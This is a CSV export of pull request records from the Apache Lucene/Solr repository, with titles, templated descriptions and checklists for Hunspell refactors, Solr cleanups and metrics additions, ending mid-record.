"","2322","LUCENE-9746: Hunspell: unify case variation logic in Stemmer and SpellChecker","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  There's duplication in this quite complicated logic  # Solution  Introduce a lambda processor to pass around, and move the logic into one place  # Tests  No new tests, no noticeable degradation in `TestPerformance`  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-08T17:52:10Z","2021-02-09T07:57:25Z"
"","2261","SOLR-15115: Remove unused methods from TestRerankBase","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  There are two unused methods in TestRerankBase: buildIndexUsingAdoc, loadModelAndFeatures which can be removed.  # Solution  Remove the methods.  # Tests  Unit tests  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","asalamon74","2021-01-28T11:29:08Z","2021-02-01T17:31:59Z"
"","1755","SOLR-14753: Improve thread annotation name","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  The thread safety annotation names are misleading/confusing for readers, yet the purpose is to clarify things for readers. Here is a fix proposed by @cpoerschke   # Solution  Change `SolrSingleThreaded` to `SolrThreadUnsafe`  # Tests  No tests required.   # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [ ] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","MarcusSorealheis","2020-08-14T22:37:29Z","2020-08-19T21:42:37Z"
"","2451","LUCENE-9687: Hunspell suggestions: reduce work in the findSimilarDictionaryEntries loop","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  The loop is called a lot of times, and some allocations and method calls can be spared  # Solution  Extract some code outside the loop  # Tests  No new tests, ~5% speedup in `TestPerformance.en_suggest`  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-03-04T12:05:42Z","2021-03-04T22:56:11Z"
"","2419","LUCENE-9804: Hunspell: fix most similar dictionary entry search","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  The comparator in PriorityQueue got reversed accidentally, no unit test noticed that, and as the result the queue didn't contain 100 most similar dictionary entries, but rather 100 pretty irrelevant ones :(  # Solution  reverse the comparator  # Tests  Added `ngram` test with 200 words from English dictionary, 100 of them relevant and 100 irrelevant  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-23T09:33:21Z","2021-02-23T16:38:21Z"
"","2202","LUCENE-9664: Hunspell support: fix most IntelliJ warnings, cleanup","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  The code produces too many warnings, so it's hard to notice newly introduced ones when developing new functionality.  # Solution  Apply IDE quick fixes, sometimes cleanup manually.  # Tests  No semantic changes, just cleanup.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-14T14:51:47Z","2021-01-15T13:15:05Z"
"","2237","LUCENE-9692: Hunspell: extract Stemmer.stripAffix from similar code in prefix/suffix processing","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  The code is too similar, can be deduplicated  # Solution  Extract a method, cleanup  # Tests  Just a refactoring, no tests  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-22T12:04:14Z","2021-01-25T11:59:15Z"
"","2209","LUCENE-9671: Hunspell: shorten Stemmer.applyAffix","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  The code is too repetitive, hard to see the differences in similarly-looking branches.  # Solution  call stem() recursively just once with different arguments depending on various conditions  # Tests  Not applicable  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-15T16:31:45Z","2021-01-19T12:39:12Z"
"","2218","LUCENE-9677: simplify Dictionary.affixData storage","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  The code around `affixData` can be simplified, at the same time reducing thread-unsafe field count  # Solution  use char[] instead of byte[], get rid of unnecessary byte array readers/writers  # Tests  It's a refactoring; existing tests pass  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-19T06:42:46Z","2021-01-19T12:38:41Z"
"","2203","LUCENE-9665: Hunspell: support default encoding","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Support aff files that don't have `SET encoding` directive  # Solution  Copy the logic from hunspell C++  # Tests  Added  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-14T15:14:08Z","2021-01-15T09:42:35Z"
"","2387","LUCENE-9782: Hunspell suggestions: split by space (but not dash) also before last char","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Suggest replacing English ""ina"" with ""in a""  # Solution  Fix off-by-one error  # Tests  `sug` expanded  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-17T13:33:23Z","2021-02-18T09:14:58Z"
"","2399","LUCENE-9786: Hunspell suggestions: try moving the last character into the middle","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Suggest abcde for abecd  # Solution  Adapt ""long char move"" loop to this case  # Tests  `sug` expanded  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-18T11:49:11Z","2021-02-19T20:08:53Z"
"","2251","LUCENE-9701: Hunspell: implement simple REP-based suggestion algorithm","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Start reimplementing Hunspell suggestion algorithm in Lucene  # Solution  For starters, support REP options and separation by dash  # Tests  `rep` and `breakdefault` from Hunspell C++  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-27T13:35:56Z","2021-02-01T09:23:55Z"
"","2307","LUCENE-9724: Hunspell: tolerate existing aff/dic file typos","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Some real life dictionaries contain mistakes that are silently tolerated by Hunspell. We'd better not throw exceptions on them as well.  # Solution  Relax some assertions.  # Tests  Added a unit test with various mistakes, removed a unit test checking for exceptions on invalid flags, reduced code duplication  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-05T09:05:45Z","2021-02-07T13:25:41Z"
"","2319","LUCENE-9743: Hunspell: ignore original tests which are out of scope","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Some of the original Hunspell's tests are out of scope of LUCENE-9687: Hunspell support improvements  # Solution  Make their failures expected for now. Plus check suggestions in `TestHunspellRepositoryTestCases`.  # Tests  The change itself is only about tests. `TestHunspellRepositoryTestCases` still fails and needs to be fixed.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-08T09:25:45Z","2021-02-08T10:53:43Z"
"","2351","LUCENE-9763: Hunspell: fix FORBIDDENWORD support","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Some of Hunspell's forbiddenword-related tests were failing  # Solution  don't decompound if it's a simple word with a forbidden root, don't lookup the word twice, don't forbid stemming (be like Hunspell)  # Tests  Take 3 tests from Hunspell  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-11T08:37:26Z","2021-02-11T17:09:55Z"
"","2415","SOLR-15178 Non-existent dependency listed in solr-core","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Solr-core has a dependency, org.apache.solr:server, which fails to download. For testing I created a test project here: https://github.com/bszabo97/solr_master_dep_test If I run the command gradle -q dependencies --configuration solrCore the dependency org.apache.solr:server shows up and fails, though if I run gradle -q dependencies --configuration solrCore8 it doesn't show up at all.  # Solution  Adding the missing artifact.  # Tests  Unit tests  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","bszabo97","2021-02-22T16:02:58Z","2021-03-18T11:57:27Z"
"","2301","LUCENE-9732: Hunspell: support dictionary entries starting with slash","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Slash shouldn't be escaped at the very beginning of words  # Solution  Support that :)  # Tests  `TestEscaped` enhanced based in `slash` from Hunspell/C++  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-04T09:58:20Z","2021-02-06T17:11:45Z"
"","2272","LUCENE-9710: Hunspell: support minor compounding-related flags","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Should be supported: COMPOUNDFLAG, COMPOUNDFORBIDFLAG, CHECKCOMPOUNDDUP, CHECKCOMPOUNDTRIPLE, SIMPLIFIEDTRIPLE, FORCEUCASE  # Solution  Support them :) and fix incorrect CHECKCOMPOUNDCASE treatment  # Tests  Corresponding tests from Hunspell/C++  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-29T12:09:43Z","2021-02-01T09:33:08Z"
"","2265","SOLR-15119 Add logs and make default splitMethod to be LINK","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  REWRITE splitMethod is considerably slower than LINK. Deprecated Autoscaling triggers used LINK method as default, contradicting SplitShardCmd.  # Solution  Unify branch_8x autoscaling code with SplitShardCmd and make the more performant splitMethod (LINK) the default.  # Tests  Added a test to SplitShardTest to run against all available split methods, and verify that an invalid splitMethod causes splits to fail.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","megancarey","2021-01-28T22:51:05Z","2021-02-22T20:26:05Z"
"","2508","SOLR-15457: Returning EnumFieldValue in faceting buckets again.","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Returning EnumFieldValue again instead of ordinal value of IntCalc.  # Solution  Adding EnumCalc to return EnumFieldValue in faceting result.  # Tests  Verify that the correct buckets are returned.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thomaswoeckinger","2021-06-08T07:49:00Z","2021-06-09T03:53:50Z"
"","2142","SOLR-14923: Reload RealtimeSearcher on next getInputDocument if forced","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Replace ulog.openRealtimeSearcher() (very expensive call inside a synchronized block) with fast and non blocking marker.   # Solution  Using AtomicBoolean to mark the RTG component to open it's realtime searcher on the next get request.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thomaswoeckinger","2020-12-11T12:49:29Z","2020-12-21T22:07:26Z"
"","2467","SOLR-15230: Removed Fields and DynamicFields Section for FieldTypes in Schema-API Command","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Removed the field and dynamicField section in example provided by the Schema-API command used to gather information on FieldTypes # Solution  Edited the schema-api.adoc file under the fieldTypes api section to remove the fields and dynamicFields section in the example provided.  # Tests  Ran ./gradlew buildSite command to verify the changes on the schema-api.html file to confirm the changes.  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","amekala2514","2021-03-09T16:29:17Z","2021-08-09T20:47:54Z"
"","1827","SOLR-14792: Remove VelocityResponseWriter","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Remove VelocityResponseWriter and its references and usages.  # Solution  Removed contrib/velocity and all related uses.  # Tests  Will ensured all Solr tests, precommit, and smoketesters pass.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [x] I have adjusted documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","erikhatcher","2020-09-04T01:16:12Z","2020-09-06T01:32:09Z"
"","2152","SOLR-14034: remove deprecated min_rf references","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Remove min_rf and MIN_REPFACT references in code, tests and documentation.  # Solution  Incrementally remove min_rf and MIN_REPFACT references.  # Tests  ./gradlew check  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","trdillon","2020-12-17T09:17:47Z","2021-01-02T06:58:41Z"
"","1712","SOLR-14702: Remove oppressive language (part1)","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please refer to this PR: https://github.com/apache/lucene-solr/pull/1711  # Solution  Replaces master with primary and slave with secondary.  # Tests  Run standard tests.   # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","MarcusSorealheis","2020-08-02T10:58:55Z","2020-08-05T10:44:43Z"
"","2040","SOLR-14965 add overseer queue size metrics","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  The Overseer work queues stored in ZK and abstracted by the Overseer can give us a good indication of the health of the cluster - if messages are taking too long to dequeue or the queue is growing too large, we know that the Overseer is overloaded and we are going to overwhelm the cluster.  This work adds metrics to track the size of the Overseer queues (ClusterStateUpdate queue and Collections Work Queue).    # Solution  Please provide a short description of the approach taken to implement your solution.  Registered these two size metrics in a shared metrics registry for the Overseer. The Overseer shared metrics registry is only initialized upon reference so this shouldn't have any impact on metrics when run in non-cloud mode. Also updated the local solr-exporter-config.xml so that these metrics are exported and can be viewed locally in Grafana.   # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  Local testing was accomplished by sending CreateCollection load and monitoring a local grafana dashboard which accessed the metrics through prometheus-exporter. As the size of these queues change extremely quickly, it was difficult 